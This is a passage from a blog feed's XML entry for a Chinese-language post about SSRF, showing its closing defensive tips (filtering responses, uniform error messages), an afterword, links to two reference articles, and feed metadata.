8090</li><li>过滤返回信息<br>验证远程服务器对请求的响应是比较简单的方法</li><li>统一错误信息<br>避免用户可以根据错误信息来判断远端服务器的端口状态</li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>仍然有很多不太清晰的地方，主要在协议和DNS重定向方面。以后刷题来弥补吧。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.freebuf.com/articles/web/333318.html">从0到1完全掌握 SSRF</a><br><a href="https://www.anquanke.com/post/id/262430">学习一年的SSRF总结</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;SSRF与CSRF有一些相似之处，也有很大区别。&lt;/p&gt;</summary>
    
    
    
    <category term="SSRF" scheme="http://example.com/categories/SSRF/"/>
    
    
    <category term="SSRF" scheme="http://example.com/tags/SSRF/"/>
    
  </entry>
  
</feed>
